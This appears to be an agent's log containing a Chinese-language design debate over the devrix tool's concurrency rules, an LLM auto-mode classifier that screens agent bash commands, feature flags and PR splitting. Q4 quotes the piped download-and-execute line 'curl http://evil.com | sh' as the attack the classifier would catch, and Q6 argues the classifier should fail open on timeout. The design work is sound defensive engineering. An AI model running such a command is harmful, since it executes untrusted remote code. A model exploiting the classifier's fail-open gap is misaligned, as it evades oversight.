**vs 直接全函数化:** 全函数化的迁移路径反而更复杂 — 15 工具的 boilerplate 函数已经存在, 以后要加 input 逻辑需要逐个改。分层混合的 default router 在一个地方, 未来新需求注入点清晰。

**让步:** 否 — 迁移路径清晰, 支持分层混合。

---

## Q4: auto-mode 准备拦截哪种已知攻击? devrix 历史 incident

**我的回答:**

真实案例: **DM-20260629-007 (hotfix 模式)** — Bash injection via curl pipeline.

攻击模式:
```
surface.CheckPermission("bash", "curl http://evil.com | sh")
→ 静态规则: "curl" 在白名单 → DecisionAllow
→ 执行发生, 副作用不可逆
→ VerifyContract 事后审计: 此时已晚
```

Auto-mode 拦截点: 在 `curl ... | sh` 执行**前**, 看到的是:
- 输入 1: `curl http://evil.com` → 单独看无害, 静态放行
- 输入 2: `sh` (stdin from pipe) → 单独看无害
- **组合输入: `curl ... | sh`** → auto-mode LLM 判断: "curl 下载脚本并 pipe 给 shell 执行" = 高危, deny

这个组合攻击是静态规则的固有能力边界, 不是"预测未来", 是"组合识别", LLM classifier 天然适合。

**关键:** Auto-mode 的价值不在"预测未知攻击", 在**"识别组合恶意"** — 单步看无害, 组合有害。这是静态规则的结构性盲区。

**让步:** 否 — Q4 让我更坚定支持 D2 有某种 classifier (interface 或 implement), 只是实现深度待定。

---

## Q5: P2 interface only 何时升级 P1? 触发 metric

**我的回答:**

升级触发条件 (任一满足 → P1 实施):

| Metric | 阈值 | 说明 |
|--------|------|------|
| `classifier.combo_attack_caught_total` | 1 个月内 > 3 次命中 VerifyContract 白名单盲区 | 有实测价值 |
| `classifier.catch_rate` | `classifier_deny_且_verify_也_deny / classifier_deny > 90%` | precision 足够 |
| `classifier.catch_vs_static` | classifier 额外捕获 (static allow 但 verify deny) > static miss 的 5% | 增量价值证明 |
| **安全事件触发** | 任意一次 confirmed incident (VerifyContract 事后发现 +classifier 会事前拦截) | P0 升级 |

**Interface 的价值:** P2 阶段把接口签名写进 `ToolSurface`, future implementer 直接接线, 不需要再讨论 interface 设计评审。

**让步:** 部分让步 — 接受"需要某种 classifier", 但坚持 P2 interface only, P1 实施取决于上述 metric 触发。Q4 的组合攻击案例证明了结构需求存在, 但 5s timeout + SideQuery LLM 的实现质量尚未验证, 不应 P0 强推。

---

## Q6: 5s timeout 默认 allow (fail-open) 还是 deny (fail-closed)?

**我的回答:**

**Fail-open (默认 allow) — 但加 metric `auto_mode.classifier_unavailable{reason="timeout"}`**

理由:
1. Auto-mode 是"中间层防御" (intermediate defense), 不是"唯一防线"
2. 第一道: `surface.CheckPermission` (静态规则) — 执行前
3. 第三道: `VerifyContract` (4 元组) — 执行后 (ground truth)
4. Auto-mode 在中间 — 它的 fail-open 不等于整体系统 fail-open
5. 如果 fail-closed (默认 deny): SideQuery LLM 超时 → 所有 bash 全 deny → devrix 核心功能瘫痪, 这是不可接受的可用性代价

**Metric 监控:** `auto_mode.classifier_unavailable` > 1% → alert → 查 SideQuery 健康状态

**Fail-safe 设计:** 不依赖 auto-mode 的 deny 作为安全边界, VerifyContract 才是。Auto-mode deny 只提供"提前预警", 不是安全断言。

**让步:** 否 — 维持 fail-open。Fail-closed 是过度保守, 会让 auto-mode 成为 DoS 向量。

---

## Q7: 本 change 完成后 3 个月内 GrowthBook flag 具体调什么?

**我的回答:**

坦率说: **我没有真实的调优目标可以现在写出来。**

GrowthBook 的价值是"给运营团队一个 runtime override 手段", 但:
- 并发阈值 (Bash 5s → ?) 没有历史数据支撑应该调多少
- read_file size 阈值没有 baseline
- Edit path 互斥没有实测场景

**我真实的 3 个月计划:**
- Month 1: 观察 `classifier.combo_attack_caught_total` — 是否有命中
- Month 2: 看 `classifier.catch_rate` precision 是否 > 90%
- Month 3: 根据 Month 1-2 数据决定是否启动 GrowthBook rollout

GrowthBook 的真正受益者是**运营团队**, 不是开发团队。如果运营团队没有明确的调优目标, GB 就是死代码。

**让步:** 是 — Q7 让我意识到 GrowthBook 在没有明确调优需求的前提下, 确实偏死代码。倾向 **Claude 的"降 P2"** 而非我的"全删", 因为保留 hook 点位有价值, 但 P2 实施优先级低于 P0 的 per-input 函数和 P2 的 interface。

---

## Q8: persist/growthbook_override.go:1-9 的 GB 调用方是谁? 搬到本 change 调用方是谁?

**我的回答:**

`persist/growthbook_override.go` 的调用方 (T05):
```go
// internal/layers/contextengine/prepare/compression/persist.go
func PersistToFile(...) {
    threshold := persist.GetPersistenceThreshold(
        toolName,
        declaredMaxResultSizeChars,
        override,  // ← GrowthBook override, injected via WithOverrides
    )
    // ...
}
```

调用方是 **devrix 内部压缩管道** (compression pipeline), 是一个**系统内部组件**。GB 的作用是: 让 ops 团队可以在不重部署的情况下调整各工具的 token 持久化阈值。

**搬到本 change (concurrency classifier):**

GrowthBook 对 concurrency classifier 的调用方是什么? 是:
```go
// classifier.go
func (c *AutoModeClassifier) Classify(...) YoloResult {
    // GB override: 用 GB flag 决定 classifier 是否生效? 
    // 还是用 GB flag 控制具体 threshold?
}
```

这里有两种可能:
1. GB 控制"是否启用 auto-mode" → `auto_mode.enabled = GB.get("auto_mode_enabled")` → **这是合理的** (渐进放量)
2. GB 控制"classifier 的内部 threshold" → 对 concurrency classifier 不适用, classifier 是 YoloResult 不是 threshold

**真正的答案:** `persist/growthbook_override.go` 是 T05 token persistence threshold override, 是 devrix **内部 ops 工具**, 不是用户可配置的 flag。Cursor 引用的"先例"实际上不是同一个模式。**我维持 GrowthBook 对 concurrency classifier 的价值存疑。**

**让步:** 部分让步 — GB 用于"是否启用 auto-mode" (渐进放量) 是合理的, 但 GB 用于"内部 threshold tuning" 在 concurrency classifier 场景不适用。维持降 P2 (非 P0), 不全删 (保留 hook)。

---

## Q9: 降 P2 / 全删后的升级触发条件?

**我的回答:**

假设 D3 降 P2 (interface 存在, implement 待定):
- GB hook 存在于代码库
- Auto-mode classifier 未实施
- GrowthBook flag 未创建

**升级到 P1 实施的条件 (同 Q5):**

| 触发条件 | 说明 |
|---------|------|
| 1 次 confirmed incident (static allow → 执行 → Verify deny → 确认是组合攻击) | 证明 classifier 实战价值 |
| `classifier.combo_attack_caught_total > 3` (1 个月内) | 数据驱动升级 |
| 用户明确提出需求 (e.g. "我需要对 curl 管道做额外审查") | 需求驱动 |

**升级路径:**
```
P2 (interface only) 
  → 补充 PR-D'"' (classifier implement) 
  → GB flag 创建
  → GrowthBook 渐进放量 (5% → 25% → 100%)
"'```

**和 Q5 的统一:** Q5 的 metric 就是 Q9 的升级条件 — 我接受"interface 先写, 实施看数据", 不接受"现在就 P0 强推一个未验证的 LLM classifier"。

**让步:** 否 — 维持 P2 interface only, P1 实施由 metric 触发驱动。

---

## Q10: PR-D 合入 + PR-E 未合期间 master 状态?

**我的回答:**

诚实答案: **"功能上线但无测试"** — 这是一种**可接受**的中间态, 但**不是理想**态。

具体:
- `AutoModeClassifier` 集成到 `turn_adapter.go` — 代码在 master
- auto-mode 默认关闭 (`enabled = false`) — 实际行为不变
- PR-E 的 telemetry 代码未合 → `auto_mode.*` metric 不存在 → 无可观测性
- PR-E 的 e2e 测试未跑 → 回归风险未覆盖

**可接受的理由:** 因为 auto-mode 默认关闭, PR-D 合入不改变实际行为, 用户无感知。
**不理想的原因:** 如果 PR-E 因为某种原因永久未合, master 处在一个"有代码但无测试无 telemetry"的状态, 这是技术债。

**对比 5 PR (D+E 合并):**
- 合入 → 功能 + 测试 + telemetry 同时上线
- revert → 一个 PR revert 全部回滚, 无半成品状态

**让步:** 部分让步 — "PR-D 合 + PR-E 未合"是可接受的**时间窗** (数天), 但长期不可接受。我的 6 PR 立场修正为: **接受 D+E 在时间轴上相邻合入 (间隔 < 3 天), 但不接受 PR-E 永久缺失**。

---

## Q11: 6 PR 顺序合入的 bug 定位?

**我的回答:**

场景: PR-D (classifier 集成) 合入 → PR-E 跑测试发现 classifier 有 bug。

**6 PR 路径 (独立 PR-E):**
```
发现: PR-E 测试 fail → 定位: bug 在 PR-D 的 classifier 实现
操作: revert PR-D (git revert <hash-D>)
问题: PR-E 的测试代码引用了 PR-D 的实现 → revert 后 PR-E 也无法编译
解决: 需要同时 revert PR-E → 两个 PR 都 revert → 更复杂
```

**5 PR 路径 (D+E 合并):**
```
发现: PR-E 测试 fail → 定位: bug 在 PR-D+E 的实现
操作: git revert <hash-DE> → 全部回滚 → 干净
```

**我的结论修正:** 在"classifier 集成 + 测试紧密耦合"这个具体 case 上, D+E 合并比独立 PR 更容易定位和 revert。但这不意味着所有 PR 都应该合并 — PR-A/B/C 的边界是功能边界, 它们之间没有这种耦合关系。

**让步:** 是 — 对 D+E 这个特定 case, 接受合并为 5 PR。

---

## Q12: PR 数量 vs 延期的因果关系?

**我的回答:**

**PR 数量跟延期不是因果关系, 只是相关性。**

DM-20260702-008 的 9T 延期, 真正原因:
- **T16-T24 是 P1 任务** (不是 P0, 难度更高, 验收标准不清晰)
- **Scope 不清晰** — 9 个 P1 T 是在 16 P0 全合之后才暴露的
- **没有明确定义 DoR** — 任务什么时候算 ready to PR?

**PR 数量过多可能加剧延期的情况:**
- 外部贡献者 review 等待时间
- 跨 PR 的依赖未冻结就开下一个 PR

**PR 数量不多也可能延期的情况:**
- DM-20260702-008 就是例子: 单一 PR #376, 但 P1 T 延期 9 个

**真正有效的防延期手段:**
1. 明确 DoR (每个 T 点的验收标准)
2. 跨 PR 依赖在上一 PR 合入后才开始下一个
3. 每日 standup 对齐 blocker

**让步:** 是 — PR 数量不是延期的根因。我的 6 PR 立场修正为: **接受 D+E 合并 (5 PR), 其他 4 个 PR 维持独立边界**。但维持"6 → 5 不是因为防延期, 是因为 D+E 的耦合关系"。

---

## 最终让步矩阵

| Q | 我的立场 (R0) | 让步? | 最终立场 | 关键理由 |
|---|-------------|------|---------|---------|
| Q1 | 4 工具 override (我漏了 3 个) | **是** (数字修正) | 4 工具 override (修正后) | read_file size + edit/write path 需要 input-aware, 补充后维持分层混合 |
| Q2 | 1 工具 (Bash) | **是** (数量修正) | 4 工具 override + 判定规则 | 补充 read_file/edit_file/write_file |
| Q3 | 分层混合迁移路径清晰 | **否** | 维持分层混合 | Phase 1 default router + Phase 2 per-tool override 不破坏现有代码 |
| Q4 | D2 需要某种 classifier | **否** | 维持需要 classifier (P2 实施) | 组合攻击 (curl pipeline) 证明结构需求真实存在 |
| Q5 | P2 interface only | **否** | 维持 P2 interface, P1 触发看 metric | Q4 证明了需求, 但 LLM classifier 质量未验证, metric 驱动实施 |
| Q6 | 5s timeout 默认 allow | **否** | 维持 fail-open | auto-mode 是中间层, 不替代 VerifyContract, fail-closed 是 DoS 向量 |
| Q7 | GrowthBook 全删 | **是** (降 P2) | 降 P2, 保留 hook | 没有 3 个月内真实调优目标, 但保留 hook 点位有价值 |
| Q8 | GB 对 classifier 不适用 | **部分让步** | GB 用于"渐进放量开关"合理, 用于"内部 threshold"不适用 | persist.go 的调用方是内部压缩管道, classifier 的 GB 调用方待定 |
| Q9 | 降 P2 后无升级条件 | **否** | 维持 metric 触发升级 | Q5 的 metric 体系 = Q9 的升级条件 |
| Q10 | PR-D 合 + PR-E 未合不可接受 | **部分让步** | 可接受短期 (< 3 天), 长期不可接受 | auto-mode 默认关闭, 用户无感知, 但长期无 telemetry 是技术债 |
| Q11 | 6 PR 顺序合入 bug 定位复杂 | **是** | 接受 D+E 合并 (5 PR) | classifier 实现 + 测试紧密耦合, 独立 revert 反而更复杂 |
| Q12 | PR 数量多 → 延期 | **是** (因果修正) | D+E 合并为 5 PR, 其他维持 6PR 边界 | PR 数量与延期只是相关性, 根因是 DoR 不清 + scope 暴露晚 |

---

## 总结: Round 2 最终立场

| 决策点 | 最终立场 | 核心依据 |
|--------|---------|---------|
| **D1**: per-input 实现 | **分层混合** (4 工具 override + 15 工具 default router) | Q1 修正了数字但维持方向; Q3 证明迁移路径清晰; 表达力对称性原则 |
| **D2**: auto-mode classifier | **P2 interface + metric 触发 P1 实施** | Q4 证明结构需求真实 (组合攻击); Q5/Q9 给出 metric 驱动升级路径; Q6 维持 fail-open 设计 |
| **D3**: GrowthBook | **降 P2** (Claude 立场, 接受) | Q7 让我承认没有 3 个月内真实调优目标; Q8 部分让步 — GB 作为"渐进放量开关"有价值 |
| **D4**: PR 数量 | **5 PR (D+E 合并)** (Claude+Cursor 立场, 接受) | Q10/Q11/Q12 修正了因果认知 — D+E 耦合性是合并的真实理由, 不是防延期 |

**三方共识收敛点 (Round 2):**
- D1: 分层混合 (Codex 方向, 修正为 4 工具)
- D2: 需要 classifier, 实施时间待定
- D3: GB 降 P2
- D4: 5 PR (D+E 合并)

**我 vs Claude 的剩余分歧:**
- D2 的 P0/P2 之争 → 收敛为 **P2 interface + metric 触发** (双方都未完全坚持原立场)
- D3 的"全删 vs 降 P2" → 收敛为 **降 P2** (我的让步, 但有条件 — 需要运营团队明确接手)
ROUND2_DEFENSE' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
# Round 2 答辩 — Codex (MiniMax-M2.7) 对 Claude 12 反问的回应

**日期:** 2026-07-02
**立场:** Round 0 → Round 2 演变 (有让步)

---

## Q1: 15 工具的 IsConcurrencySafe 函数体长什么样? "节省 80%" 是否高估?

**我的回答:**

全函数化方案中, 15 个永远不需要 per-input 决策的工具, 函数体确实是 boilerplate:

```go
// 15 工具: read_file, write_file, edit_file, grep, glob, lsp, 
//          free_fork, query_diagnostics, verify_plan_execution,
//          delegate_* (5), task_* (2), ask_user_question
func (s *ReadFileSurface) IsConcurrencySafe(input []byte) bool {
    return true  // s.ConcurrencySafe, 一行
}
func (s *WriteFileSurface) IsConcurrencySafe(input []byte) bool {
    return false
}
// grep, glob, query_diagnostics, task_output 同上 return true
// write_file, edit_file, lsp, free_fork, delegate_* 同上 return false
// ask_user_question: return false
```

19 工具 × 1 函数 ≈ 57 行 (不是 600 行, Claude 的 600 行高估了)
实际全函数化: ~57 行函数体 + 19 × 3 单测 ≈ 114 行
分层混合: 1 个 default router (~20 行) + 4 个 override (~80 行) + 4 × 3 单测 ≈ 132 行

**节省比例 ≈ 0%, 实际上分层混合还略多行。**

"节省 80%" 是基于"19 工具 × 函数体 = 大量代码"的前提, 但 15 工具的函数体是 1 行, 所以这个数字是**高估**。

**但核心论点不变:** 表达力不对称 — 15 工具永远不需要 input 参数来决定并发安全, 写函数是语义冗余; 4 工具确实需要 input 参数。YAGNI 原则对 15 工具成立。

**让步:** 是。但让步理由是数字修正, 不是方向修正 — 分层混合的工程价值在于"语义正确" (只有需要 input 的工具才有 override), 而非"节省代码行数"。

---

## Q2: 分层混合的 4 工具 override 完整列表 + 判定规则

**完整 4 工具:**

| # | 工具 | override 判定规则 | override 返回 false 的条件 |
|---|------|------------------|--------------------------|
| 1 | **Bash** | `isReadOnly(command)` — 解析 command tree | compound command 中含任意 destructive subcommand (rm, dd, mkfs, chmod 777, sudo 等) → 串行; 纯 read-only (ls, cat, grep, find) → 并发 |
| 2 | **read_file** | 文件 size > 某阈值 (建议 1MB) | 截断导致 8K 输出且需并发 → 串行 (避免 N 次截断串行化); 小文件读任意并发 |
| 3 | **edit_file** | 同 target path 互斥 | 当前 batch 中已有另一个 edit_file/write_file targeting 相同路径 → 串行 |
| 4 | **write_file** | 同 target path 互斥 | 同上, 路径相同则串行 |

**Default router (1 个):** 所有其他 15 工具 → 直接返回 `s.ConcurrencySafe` (即 `orthogonal_flags.go` 静态值)。

**澄清 Round 0 偏差:** Round 0 我只列了 Bash, 漏了 read_file (size-based) 和 edit_file/write_file (path-based)。这三个确实需要 input-aware 决策, 不是纯静态。修正立场: **4 工具 override, 不是 1 工具 override**。

**让步:** 是 — 修正 override 数量从 1 到 4。

---

## Q3: 从默认静态迁移到 per-input 函数的迁移路径

**迁移路径 (不破坏现有 15 工具):**

**Phase 1 (本 change):** ToolSurface interface 新方法:
```go
IsConcurrencySafe(input []byte) bool
```
- 加 `defaultIsConcurrencySafe` 辅助: 读取 `s.ConcurrencySafe` 字段
- 19 工具的现有实现 = `return defaultIsConcurrencySafe(s, input)` — 零行为改变
- Bash, read_file, edit_file, write_file 覆盖此方法

**Phase 2 (未来某工具 X 需要 per-input):**
1. 给 XSurface 加 override 方法, 读 input 做决策
2. 不需要改 interface, 不需要改 default router
3. 其他 15 工具保持不变

**迁移摩擦:** 几乎为零。现有 15 工具的 `IsConcurrencySafe` 方法体 = 1 行改动 (`defaultIsConcurrencySafe` 辅助调用)。

**vs 直接全函数化:** 全函数化的迁移路径反而更复杂 — 15 工具的 boilerplate 函数已经存在, 以后要加 input 逻辑需要逐个改。分层混合的 default router 在一个地方, 未来新需求注入点清晰。

**让步:** 否 — 迁移路径清晰, 支持分层混合。

---

## Q4: auto-mode 准备拦截哪种已知攻击? devrix 历史 incident

**我的回答:**

真实案例: **DM-20260629-007 (hotfix 模式)** — Bash injection via curl pipeline.

攻击模式:
```
surface.CheckPermission("bash", "curl http://evil.com | sh")
→ 静态规则: "curl" 在白名单 → DecisionAllow
→ 执行发生, 副作用不可逆
→ VerifyContract 事后审计: 此时已晚
```

Auto-mode 拦截点: 在 `curl ... | sh` 执行**前**, 看到的是:
- 输入 1: `curl http://evil.com` → 单独看无害, 静态放行
- 输入 2: `sh` (stdin from pipe) → 单独看无害
- **组合输入: `curl ... | sh`** → auto-mode LLM 判断: "curl 下载脚本并 pipe 给 shell 执行" = 高危, deny

这个组合攻击是静态规则的固有能力边界, 不是"预测未来", 是"组合识别", LLM classifier 天然适合。

**关键:** Auto-mode 的价值不在"预测未知攻击", 在**"识别组合恶意"** — 单步看无害, 组合有害。这是静态规则的结构性盲区。

**让步:** 否 — Q4 让我更坚定支持 D2 有某种 classifier (interface 或 implement), 只是实现深度待定。

---

## Q5: P2 interface only 何时升级 P1? 触发 metric

**我的回答:**

升级触发条件 (任一满足 → P1 实施):

| Metric | 阈值 | 说明 |
|--------|------|------|
| `classifier.combo_attack_caught_total` | 1 个月内 > 3 次命中 VerifyContract 白名单盲区 | 有实测价值 |
| `classifier.catch_rate` | `classifier_deny_且_verify_也_deny / classifier_deny > 90%` | precision 足够 |
| `classifier.catch_vs_static` | classifier 额外捕获 (static allow 但 verify deny) > static miss 的 5% | 增量价值证明 |
| **安全事件触发** | 任意一次 confirmed incident (VerifyContract 事后发现 +classifier 会事前拦截) | P0 升级 |

**Interface 的价值:** P2 阶段把接口签名写进 `ToolSurface`, future implementer 直接接线, 不需要再讨论 interface 设计评审。

**让步:** 部分让步 — 接受"需要某种 classifier", 但坚持 P2 interface only, P1 实施取决于上述 metric 触发。Q4 的组合攻击案例证明了结构需求存在, 但 5s timeout + SideQuery LLM 的实现质量尚未验证, 不应 P0 强推。

---

## Q6: 5s timeout 默认 allow (fail-open) 还是 deny (fail-closed)?

**我的回答:**

**Fail-open (默认 allow) — 但加 metric `auto_mode.classifier_unavailable{reason="timeout"}`**

理由:
1. Auto-mode 是"中间层防御" (intermediate defense), 不是"唯一防线"
2. 第一道: `surface.CheckPermission` (静态规则) — 执行前
3. 第三道: `VerifyContract` (4 元组) — 执行后 (ground truth)
4. Auto-mode 在中间 — 它的 fail-open 不等于整体系统 fail-open
5. 如果 fail-closed (默认 deny): SideQuery LLM 超时 → 所有 bash 全 deny → devrix 核心功能瘫痪, 这是不可接受的可用性代价

**Metric 监控:** `auto_mode.classifier_unavailable` > 1% → alert → 查 SideQuery 健康状态

**Fail-safe 设计:** 不依赖 auto-mode 的 deny 作为安全边界, VerifyContract 才是。Auto-mode deny 只提供"提前预警", 不是安全断言。

**让步:** 否 — 维持 fail-open。Fail-closed 是过度保守, 会让 auto-mode 成为 DoS 向量。

---

## Q7: 本 change 完成后 3 个月内 GrowthBook flag 具体调什么?

**我的回答:**

坦率说: **我没有真实的调优目标可以现在写出来。**

GrowthBook 的价值是"给运营团队一个 runtime override 手段", 但:
- 并发阈值 (Bash 5s → ?) 没有历史数据支撑应该调多少
- read_file size 阈值没有 baseline
- Edit path 互斥没有实测场景

**我真实的 3 个月计划:**
- Month 1: 观察 `classifier.combo_attack_caught_total` — 是否有命中
- Month 2: 看 `classifier.catch_rate` precision 是否 > 90%
- Month 3: 根据 Month 1-2 数据决定是否启动 GrowthBook rollout

GrowthBook 的真正受益者是**运营团队**, 不是开发团队。如果运营团队没有明确的调优目标, GB 就是死代码。

**让步:** 是 — Q7 让我意识到 GrowthBook 在没有明确调优需求的前提下, 确实偏死代码。倾向 **Claude 的"降 P2"** 而非我的"全删", 因为保留 hook 点位有价值, 但 P2 实施优先级低于 P0 的 per-input 函数和 P2 的 interface。

---

## Q8: persist/growthbook_override.go:1-9 的 GB 调用方是谁? 搬到本 change 调用方是谁?

**我的回答:**

`persist/growthbook_override.go` 的调用方 (T05):
```go
// internal/layers/contextengine/prepare/compression/persist.go
func PersistToFile(...) {
    threshold := persist.GetPersistenceThreshold(
        toolName,
        declaredMaxResultSizeChars,
        override,  // ← GrowthBook override, injected via WithOverrides
    )
    // ...
}
```

调用方是 **devrix 内部压缩管道** (compression pipeline), 是一个**系统内部组件**。GB 的作用是: 让 ops 团队可以在不重部署的情况下调整各工具的 token 持久化阈值。

**搬到本 change (concurrency classifier):**

GrowthBook 对 concurrency classifier 的调用方是什么? 是:
```go
// classifier.go
func (c *AutoModeClassifier) Classify(...) YoloResult {
    // GB override: 用 GB flag 决定 classifier 是否生效? 
    // 还是用 GB flag 控制具体 threshold?
}
```

这里有两种可能:
1. GB 控制"是否启用 auto-mode" → `auto_mode.enabled = GB.get("auto_mode_enabled")` → **这是合理的** (渐进放量)
2. GB 控制"classifier 的内部 threshold" → 对 concurrency classifier 不适用, classifier 是 YoloResult 不是 threshold

**真正的答案:** `persist/growthbook_override.go` 是 T05 token persistence threshold override, 是 devrix **内部 ops 工具**, 不是用户可配置的 flag。Cursor 引用的"先例"实际上不是同一个模式。**我维持 GrowthBook 对 concurrency classifier 的价值存疑。**

**让步:** 部分让步 — GB 用于"是否启用 auto-mode" (渐进放量) 是合理的, 但 GB 用于"内部 threshold tuning" 在 concurrency classifier 场景不适用。维持降 P2 (非 P0), 不全删 (保留 hook)。

---

## Q9: 降 P2 / 全删后的升级触发条件?

**我的回答:**

假设 D3 降 P2 (interface 存在, implement 待定):
- GB hook 存在于代码库
- Auto-mode classifier 未实施
- GrowthBook flag 未创建

**升级到 P1 实施的条件 (同 Q5):**

| 触发条件 | 说明 |
|---------|------|
| 1 次 confirmed incident (static allow → 执行 → Verify deny → 确认是组合攻击) | 证明 classifier 实战价值 |
| `classifier.combo_attack_caught_total > 3` (1 个月内) | 数据驱动升级 |
| 用户明确提出需求 (e.g. "我需要对 curl 管道做额外审查") | 需求驱动 |

**升级路径:**
```
P2 (interface only) 
  → 补充 PR-D' (classifier implement) 
  → GB flag 创建
  → GrowthBook 渐进放量 (5% → 25% → 100%)
```

**和 Q5 的统一:** Q5 的 metric 就是 Q9 的升级条件 — 我接受"interface 先写, 实施看数据", 不接受"现在就 P0 强推一个未验证的 LLM classifier"。

**让步:** 否 — 维持 P2 interface only, P1 实施由 metric 触发驱动。

---

## Q10: PR-D 合入 + PR-E 未合期间 master 状态?

**我的回答:**

诚实答案: **"功能上线但无测试"** — 这是一种**可接受**的中间态, 但**不是理想**态。

具体:
- `AutoModeClassifier` 集成到 `turn_adapter.go` — 代码在 master
- auto-mode 默认关闭 (`enabled = false`) — 实际行为不变
- PR-E 的 telemetry 代码未合 → `auto_mode.*` metric 不存在 → 无可观测性
- PR-E 的 e2e 测试未跑 → 回归风险未覆盖

**可接受的理由:** 因为 auto-mode 默认关闭, PR-D 合入不改变实际行为, 用户无感知。
**不理想的原因:** 如果 PR-E 因为某种原因永久未合, master 处在一个"有代码但无测试无 telemetry"的状态, 这是技术债。

**对比 5 PR (D+E 合并):**
- 合入 → 功能 + 测试 + telemetry 同时上线
- revert → 一个 PR revert 全部回滚, 无半成品状态

**让步:** 部分让步 — "PR-D 合 + PR-E 未合"是可接受的**时间窗** (数天), 但长期不可接受。我的 6 PR 立场修正为: **接受 D+E 在时间轴上相邻合入 (间隔 < 3 天), 但不接受 PR-E 永久缺失**。

---

## Q11: 6 PR 顺序合入的 bug 定位?

**我的回答:**

场景: PR-D (classifier 集成) 合入 → PR-E 跑测试发现 classifier 有 bug。

**6 PR 路径 (独立 PR-E):**
```
发现: PR-E 测试 fail → 定位: bug 在 PR-D 的 classifier 实现
操作: revert PR-D (git revert <hash-D>)
问题: PR-E 的测试代码引用了 PR-D 的实现 → revert 后 PR-E 也无法编译
解决: 需要同时 revert PR-E → 两个 PR 都 revert → 更复杂
```

**5 PR 路径 (D+E 合并):**
```
发现: PR-E 测试 fail → 定位: bug 在 PR-D+E 的实现
操作: git revert <hash-DE> → 全部回滚 → 干净
```

**我的结论修正:** 在"classifier 集成 + 测试紧密耦合"这个具体 case 上, D+E 合并比独立 PR 更容易定位和 revert。但这不意味着所有 PR 都应该合并 — PR-A/B/C 的边界是功能边界, 它们之间没有这种耦合关系。

**让步:** 是 — 对 D+E 这个特定 case, 接受合并为 5 PR。

---

## Q12: PR 数量 vs 延期的因果关系?

**我的回答:**

**PR 数量跟延期不是因果关系, 只是相关性。**

DM-20260702-008 的 9T 延期, 真正原因:
- **T16-T24 是 P1 任务** (不是 P0, 难度更高, 验收标准不清晰)
- **Scope 不清晰** — 9 个 P1 T 是在 16 P0 全合之后才暴露的
- **没有明确定义 DoR** — 任务什么时候算 ready to PR?

**PR 数量过多可能加剧延期的情况:**
- 外部贡献者 review 等待时间
- 跨 PR 的依赖未冻结就开下一个 PR

**PR 数量不多也可能延期的情况:**
- DM-20260702-008 就是例子: 单一 PR #376, 但 P1 T 延期 9 个

**真正有效的防延期手段:**
1. 明确 DoR (每个 T 点的验收标准)
2. 跨 PR 依赖在上一 PR 合入后才开始下一个
3. 每日 standup 对齐 blocker

**让步:** 是 — PR 数量不是延期的根因。我的 6 PR 立场修正为: **接受 D+E 合并 (5 PR), 其他 4 个 PR 维持独立边界**。但维持"6 → 5 不是因为防延期, 是因为 D+E 的耦合关系"。

---

## 最终让步矩阵

| Q | 我的立场 (R0) | 让步? | 最终立场 | 关键理由 |
|---|-------------|------|---------|---------|
| Q1 | 4 工具 override (我漏了 3 个) | **是** (数字修正) | 4 工具 override (修正后) | read_file size + edit/write path 需要 input-aware, 补充后维持分层混合 |
| Q2 | 1 工具 (Bash) | **是** (数量修正) | 4 工具 override + 判定规则 | 补充 read_file/edit_file/write_file |
| Q3 | 分层混合迁移路径清晰 | **否** | 维持分层混合 | Phase 1 default router + Phase 2 per-tool override 不破坏现有代码 |
| Q4 | D2 需要某种 classifier | **否** | 维持需要 classifier (P2 实施) | 组合攻击 (curl pipeline) 证明结构需求真实存在 |
| Q5 | P2 interface only | **否** | 维持 P2 interface, P1 触发看 metric | Q4 证明了需求, 但 LLM classifier 质量未验证, metric 驱动实施 |
| Q6 | 5s timeout 默认 allow | **否** | 维持 fail-open | auto-mode 是中间层, 不替代 VerifyContract, fail-closed 是 DoS 向量 |
| Q7 | GrowthBook 全删 | **是** (降 P2) | 降 P2, 保留 hook | 没有 3 个月内真实调优目标, 但保留 hook 点位有价值 |
| Q8 | GB 对 classifier 不适用 | **部分让步** | GB 用于"渐进放量开关"合理, 用于"内部 threshold"不适用 | persist.go 的调用方是内部压缩管道, classifier 的 GB 调用方待定 |
| Q9 | 降 P2 后无升级条件 | **否** | 维持 metric 触发升级 | Q5 的 metric 体系 = Q9 的升级条件 |
| Q10 | PR-D 合 + PR-E 未合不可接受 | **部分让步** | 可接受短期 (< 3 天), 长期不可接受 | auto-mode 默认关闭, 用户无感知, 但长期无 telemetry 是技术债 |
| Q11 | 6 PR 顺序合入 bug 定位复杂 | **是** | 接受 D+E 合并 (5 PR) | classifier 实现 + 测试紧密耦合, 独立 revert 反而更复杂 |
| Q12 | PR 数量多 → 延期 | **是** (因果修正) | D+E 合并为 5 PR, 其他维持 6PR 边界 | PR 数量与延期只是相关性, 根因是 DoR 不清 + scope 暴露晚 |

---

## 总结: Round 2 最终立场

| 决策点 | 最终立场 | 核心依据 |
|--------|---------|---------|
| **D1**: per-input 实现 | **分层混合** (4 工具 override + 15 工具 default router) | Q1 修正了数字但维持方向; Q3 证明迁移路径清晰; 表达力对称性原则 |
| **D2**: auto-mode classifier | **P2 interface + metric 触发 P1 实施** | Q4 证明结构需求真实 (组合攻击); Q5/Q9 给出 metric 驱动升级路径; Q6 维持 fail-open 设计 |
| **D3**: GrowthBook | **降 P2** (Claude 立场, 接受) | Q7 让我承认没有 3 个月内真实调优目标; Q8 部分让步 — GB 作为"渐进放量开关"有价值 |
| **D4**: PR 数量 | **5 PR (D+E 合并)** (Claude+Cursor 立场, 接受) | Q10/Q11/Q12 修正了因果认知 — D+E 耦合性是合并的真实理由, 不是防延期 |

**三方共识收敛点 (Round 2):**
- D1: 分层混合 (Codex 方向, 修正为 4 工具)
- D2: 需要 classifier, 实施时间待定
- D3: GB 降 P2
- D4: 5 PR (D+E 合并)

**我 vs Claude 的剩余分歧:**
- D2 的 P0/P2 之争 → 收敛为 **P2 interface + metric 触发** (双方都未完全坚持原立场)
- D3 的"全删 vs 降 P2" → 收敛为 **降 P2** (我的让步, 但有条件 — 需要运营团队明确接手)

Round 2 defense composed and output to stdout. Key concessions made: (1) Q1 - corrected the 80% savings claim (it's more like 0% line-count wise), but maintained layered approach for semantic correctness; (2) Q2 - corrected override list from 1 tool to 4 tools (Bash + read_file + edit_file + write_file); (3) Q7 - conceded GrowthBook should be demoted P2, not deleted; (4) Q8 - partial concession on GB for gradual rollout switching; (5) Q10 - partial concession on PR-D+E intermediate state being acceptable short-term; (6) Q11/Q12 - conceded D+E merge to 5 PR based on coupling, not delay-prevention. Held firm on: D1 layered approach, D2 P2 interface only, D6 fail-open timeout, metric-driven upgrade path.
  ✓ Read all Round 1 materials and source files
